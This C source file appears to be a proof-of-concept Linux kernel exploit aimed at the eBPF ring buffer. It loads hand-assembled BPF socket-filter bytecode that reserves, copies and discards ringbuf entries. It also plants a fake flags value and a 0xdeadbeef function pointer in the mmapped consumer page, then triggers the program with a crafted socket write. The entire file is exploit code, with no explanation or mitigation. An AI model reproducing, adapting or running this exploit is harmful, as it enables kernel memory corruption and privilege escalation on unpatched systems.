#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/wait.h>
#include <linux/bpf.h>
#include <sys/mman.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <syscall.h>
#include <err.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <assert.h>
#include <sys/sendfile.h>
#ifndef __NR_BPF
#define __NR_BPF 321
#endif
#define ptr_to_u64(ptr) ((__u64)(unsigned long)(ptr))
#ifndef SYS_pidfd_getfd
#define SYS_pidfd_getfd 438
#endif
#define SYSCHK(x)                     \
    ({                                \
        typeof(x) __res = (x);        \
        if (__res == (typeof(x))-1)   \
            err(1, "SYSCHK(" #x ")"); \
        __res;                        \
    })

#define PAUSE           \
    {                   \
        printf(":");    \
        int x;          \
        read(0, &x, 1); \
    }

#define BPF_F_MMAPABLE 1024
#define BPF_FUNC_ringbuf_query 134
#define BPF_FUNC_ringbuf_reserve 131
#define BPF_MAP_TYPE_RINGBUF 27
#define BPF_FUNC_ringbuf_discard 133
#define BPF_FUNC_ringbuf_output 130
#define BPF_FUNC_skb_load_bytes 26

#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \
    ((struct bpf_insn){.code = CODE,           \
                       .dst_reg = DST,         \
                       .src_reg = SRC,         \
                       .off = OFF,             \
                       .imm = IMM})

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)                   \
    ((struct bpf_insn){.code = BPF_LD | BPF_DW | BPF_IMM, \
                       .dst_reg = DST,                    \
                       .src_reg = SRC,                    \
                       .off = 0,                          \
                       .imm = (__u32)(IMM)}),             \
        ((struct bpf_insn){.code = 0,                     \
                           .dst_reg = 0,                  \
                           .src_reg = 0,                  \
                           .off = 0,                      \
                           .imm = ((__u64)(IMM)) >> 32})

#define BPF_MOV64_IMM(DST, IMM) \
    BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, DST, 0, 0, IMM)

#define BPF_MOV_REG(DST, SRC) \
    BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_X, DST, SRC, 0, 0)

#define BPF_MOV64_REG(DST, SRC) \
    BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_X, DST, SRC, 0, 0)

#define BPF_MOV_IMM(DST, IMM) \
    BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_K, DST, 0, 0, IMM)

#define BPF_RSH_REG(DST, SRC) \
    BPF_RAW_INSN(BPF_ALU64 | BPF_RSH | BPF_X, DST, SRC, 0, 0)

#define BPF_LSH_IMM(DST, IMM) \
    BPF_RAW_INSN(BPF_ALU64 | BPF_LSH | BPF_K, DST, 0, 0, IMM)

#define BPF_ALU64_IMM(OP, DST, IMM) \
    BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)

#define BPF_ALU64_REG(OP, DST, SRC) \
    BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_X, DST, SRC, 0, 0)

#define BPF_ALU_IMM(OP, DST, IMM) \
    BPF_RAW_INSN(BPF_ALU | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)

#define BPF_JMP_IMM(OP, DST, IMM, OFF) \
    BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)

#define BPF_JMP_REG(OP, DST, SRC, OFF) \
    BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_X, DST, SRC, OFF, 0)

#define BPF_JMP32_REG(OP, DST, SRC, OFF) \
    BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_X, DST, SRC, OFF, 0)

#define BPF_JMP32_IMM(OP, DST, IMM, OFF) \
    BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)

#define BPF_EXIT_INSN() BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0)

#define BPF_LD_MAP_FD(DST, MAP_FD) \
    BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)

#define BPF_LD_IMM64(DST, IMM) BPF_LD_IMM64_RAW(DST, 0, IMM)

#define BPF_ST_MEM(SIZE, DST, OFF, IMM) \
    BPF_RAW_INSN(BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, DST, 0, OFF, IMM)

#define BPF_LDX_MEM(SIZE, DST, SRC, OFF) \
    BPF_RAW_INSN(BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)

#define BPF_STX_MEM(SIZE, DST, SRC, OFF) \
    BPF_RAW_INSN(BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)

#define BPF_LD_ABS(SIZE, IMM)                                     \
    ((struct bpf_insn){.code = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS, \
                       .dst_reg = 0,                              \
                       .src_reg = 0,                              \
                       .off = 0,                                  \
                       .imm = IMM})

#define BPF_MAP_GET(idx, dst)                                   \
    BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),                        \
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                   \
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                  \
        BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),                 \
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0,               \
                     BPF_FUNC_map_lookup_elem),                 \
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), BPF_EXIT_INSN(), \
        BPF_LDX_MEM(BPF_DW, dst, BPF_REG_0, 0),                 \
        BPF_MOV64_IMM(BPF_REG_0, 0)

#define BPF_MAP_GET_ADDR(idx, dst)                              \
    BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),                        \
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                   \
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                  \
        BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),                 \
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0,               \
                     BPF_FUNC_map_lookup_elem),                 \
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), BPF_EXIT_INSN(), \
        BPF_MOV64_REG((dst), BPF_REG_0), BPF_MOV64_IMM(BPF_REG_0, 0)

#define LOG_BUF_SIZE 65536

#define BPF_HEAVY_JOB                             \
    BPF_MOV64_REG(BPF_REG_1, BPF_REG_6),          \
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_7),      \
        BPF_MOV64_IMM(BPF_REG_3, 0x10000000),     \
        BPF_MOV64_IMM(BPF_REG_4, 0x0),            \
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, \
                     BPF_FUNC_ringbuf_output)

#define INST(x) (sizeof(x) / sizeof(struct bpf_insn))

char bpf_log_buf[LOG_BUF_SIZE];
char buf[0x3000];

void set_cpu(int i)
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(i, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
}

int bpf_create_map(enum bpf_map_type map_type, unsigned int key_size,
                   unsigned int value_size, unsigned int max_entries,
                   unsigned int map_fd)
{
    union bpf_attr attr = {.map_type = map_type,
                           .key_size = key_size,
                           .value_size = value_size,
                           .max_entries = max_entries,
                           .inner_map_fd = map_fd};

    return SYSCHK(syscall(__NR_BPF, BPF_MAP_CREATE, &attr, sizeof(attr)));
}

int bpf_create_map_mmap(enum bpf_map_type map_type, unsigned int key_size,
                        unsigned int value_size, unsigned int max_entries,
                        unsigned int map_fd)
{
    union bpf_attr attr = {
        .map_type = map_type,
        .key_size = key_size,
        .value_size = value_size,
        .max_entries = max_entries,
        .inner_map_fd = map_fd,
        .map_flags = BPF_F_MMAPABLE,
    };

    return SYSCHK(syscall(__NR_BPF, BPF_MAP_CREATE, &attr, sizeof(attr)));
}

int bpf_lookup_elem(int fd, const void *key, void *value)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key = ptr_to_u64(key),
        .value = ptr_to_u64(value),
    };

    return SYSCHK(
        syscall(__NR_BPF, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr)));
}

int bpf_update_elem(int fd, const void *key, const void *value, uint64_t flags)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key = ptr_to_u64(key),
        .value = ptr_to_u64(value),
        .flags = flags,
    };

    return SYSCHK(
        syscall(__NR_BPF, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr)));
}

int bpf_prog_load(enum bpf_prog_type type, const struct bpf_insn *insns,
                  int insn_cnt, const char *license)
{
    union bpf_attr attr = {
        .prog_type = type,
        .insns = ptr_to_u64(insns),
        .insn_cnt = insn_cnt,
        .license = ptr_to_u64(license),
        .log_buf = ptr_to_u64(bpf_log_buf),
        .log_size = LOG_BUF_SIZE,
        .log_level = 3,
    };

    return syscall(__NR_BPF, BPF_PROG_LOAD, &attr, sizeof(attr));
}

int update_elem(int mapfd, int key, size_t val)
{
    return bpf_update_elem(mapfd, &key, &val, 0);
}

size_t get_elem(int mapfd, int key)
{
    size_t val;
    bpf_lookup_elem(mapfd, &key, &val);
    return val;
}

void load_bpf_prog(struct bpf_insn *prog, int prog_cnt, int *sfd)
{
    int progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, prog_cnt,
                               "GPL");
    if (progfd < 0)
    {
        puts("Fail");
        puts(bpf_log_buf);
        exit(0);
    }
    socketpair(AF_UNIX, SOCK_DGRAM, 0, sfd);
    setsockopt(sfd[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd));
    close(progfd);
}

int main(int argc, char **argv)
{
    setvbuf(stdout, 0, 2, 0);

    int ringbuf = bpf_create_map(BPF_MAP_TYPE_RINGBUF, 0, 0, 0x4000, 0);
    int dummy_ringbuf = bpf_create_map(BPF_MAP_TYPE_RINGBUF, 0, 0, 0x4000, 0);
    int sfd[2] = {};
    void *consumer_pos = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, ringbuf, 0);
    if (consumer_pos == MAP_FAILED)
    {
        perror("mmap ringbuf failed");
        exit(1);
    }
    void *userdata = mmap(NULL, 0x3000, PROT_READ | PROT_WRITE | MAP_POPULATE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (userdata == MAP_FAILED)
    {
        perror("mmap userdata failed");
        exit(1);
    }

    memset(userdata, 'A', 0x3000);

    *(unsigned long *)(consumer_pos + 0x00) = 0x3000;
    *(unsigned long *)(consumer_pos + 0x18) = 0x2;        // flags
    *(unsigned long *)(consumer_pos + 0x28) = 0xdeadbeef; // func

    struct bpf_insn prog[] = {
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_1),

        // 1. reserve dummy ringbuf 0x3000
        BPF_LD_MAP_FD(BPF_REG_1, dummy_ringbuf),
        BPF_MOV64_IMM(BPF_REG_2, 0x3000),
        BPF_MOV64_IMM(BPF_REG_3, 0x0),
        BPF_RAW_INSN(
            BPF_JMP | BPF_CALL, 0, 0, 0,
            BPF_FUNC_ringbuf_reserve),
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),

        // 2. fill dummy reserved space with 'A'
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_7),
        BPF_MOV64_IMM(BPF_REG_2, 0),
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_6),
        BPF_MOV64_IMM(BPF_REG_4, 0x3000),
        BPF_RAW_INSN(
            BPF_JMP | BPF_CALL, 0, 0, 0,
            BPF_FUNC_skb_load_bytes),
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 5),
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_6),
        BPF_MOV64_IMM(BPF_REG_2, 0x1),
        BPF_RAW_INSN(
            BPF_JMP | BPF_CALL, 0, 0, 0,
            BPF_FUNC_ringbuf_discard),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),

        // 3. reserve target ringbuf 0x3000
        BPF_LD_MAP_FD(BPF_REG_1, ringbuf),
        BPF_MOV64_IMM(BPF_REG_2, 0x3000),
        BPF_MOV64_IMM(BPF_REG_3, 0x0),
        BPF_RAW_INSN(
            BPF_JMP | BPF_CALL, 0, 0, 0,
            BPF_FUNC_ringbuf_reserve),
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 5),
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_6),
        BPF_MOV64_IMM(BPF_REG_2, 0x1),
        BPF_RAW_INSN(
            BPF_JMP | BPF_CALL, 0, 0, 0,
            BPF_FUNC_ringbuf_discard),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),

        // 4. copy dummy ringbuf to target ringbuf
        BPF_LD_MAP_FD(BPF_REG_1, ringbuf),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_6),
        BPF_MOV64_IMM(BPF_REG_3, 0x3000),
        BPF_MOV64_IMM(BPF_REG_4, 0x0),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0,
                     BPF_FUNC_ringbuf_output),

        BPF_MOV64_REG(BPF_REG_1, BPF_REG_6),
        BPF_MOV64_IMM(BPF_REG_2, 0x1),
        BPF_RAW_INSN(
            BPF_JMP | BPF_CALL, 0, 0, 0,
            BPF_FUNC_ringbuf_discard),

        BPF_MOV64_REG(BPF_REG_1, BPF_REG_7),
        BPF_MOV64_IMM(BPF_REG_2, 0x2),
        BPF_RAW_INSN(
            BPF_JMP | BPF_CALL, 0, 0, 0,
            BPF_FUNC_ringbuf_discard),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    load_bpf_prog((struct bpf_insn *)&prog, INST(prog), sfd);

    for (int i = 0; i < 0x3000; i += 4)
    {
        *(unsigned int *)(buf + i) = 0x2; // pgoff = 2, ref to consumer
    }

    write(sfd[0], buf, 0x3000);
    return 0;
}